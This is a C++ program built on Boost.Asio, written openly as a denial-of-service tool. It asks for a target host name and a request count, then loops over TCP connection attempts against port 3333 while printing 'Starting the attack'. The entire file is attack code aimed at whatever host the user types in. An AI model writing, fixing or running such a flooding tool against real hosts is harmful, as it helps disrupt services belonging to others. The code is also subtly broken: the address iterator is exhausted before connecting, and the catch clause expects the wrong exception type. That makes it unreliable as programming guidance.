#include <iostream>
#include <boost/asio.hpp>

using namespace std;
using namespace boost;

int main(int argc, char** argv)
{
    string port_number = "3333";
    string host_name = "";
    int attempts = 0;
    cout << "Enter the host name to Dos e.g(www.samplehost.com) : ";
    cin >> host_name;
    cout << "Enter the number of requests to send to the host name (default 10000) : ";
    cin >> attempts;
    asio::io_service ios;
    // Resolve the dns name to an ip address.
    asio::ip::tcp::resolver::query dns_name_query(host_name,port_number,asio::ip::tcp::resolver::numeric_service);
    
    asio::ip::tcp::resolver resolver(ios);
    try
    {
        // AN ITERATOR TO CAPTURE THE IP ADDRESSES ASSOCIATED WITH THE DNS NAME.
        asio::ip::tcp::resolver::iterator it   = resolver.resolve(dns_name_query);
        asio::ip::tcp::resolver::iterator it_end;
        asio::ip::tcp::endpoint ep;
        // Print the Resolved IP address that the attack will aim at.
        cerr << "-------------RESOLVING IP ADDRESSES FROM THE DNS NAME-------------" << endl;
        for(; it != it_end; ++it)
        {
            ep = it->endpoint();
            string ip_address = ep.address().to_string();
            cerr << "IP address : " << ip_address <<endl;
        }
        // Create a socket and open it for connection.
        asio::ip::tcp::socket sock(ios,ep.protocol());
        cerr << "Starting the attack"<<endl;
        if (attempts <= 0)
        {
            for (int x = 0; x < 10000; x++)
            {
                asio::connect(sock,it);
            }
            cerr << "Attempted : " <<10000<< " attempts on the Host name" << endl;

        }
        else
        {
            for (int x = 0; x < attempts; x++)
            {
                asio::connect(sock,it);
            }
            cerr << "Attempted : " <<attempts<< " attempts on the Host name" << endl;
        }

    }
    catch(boost::system::error_code &ec)
    {
        cerr << "Error code : "<<ec.value()  << " error message : " << ec.message() << endl;
        return ec.value();
    }
    


}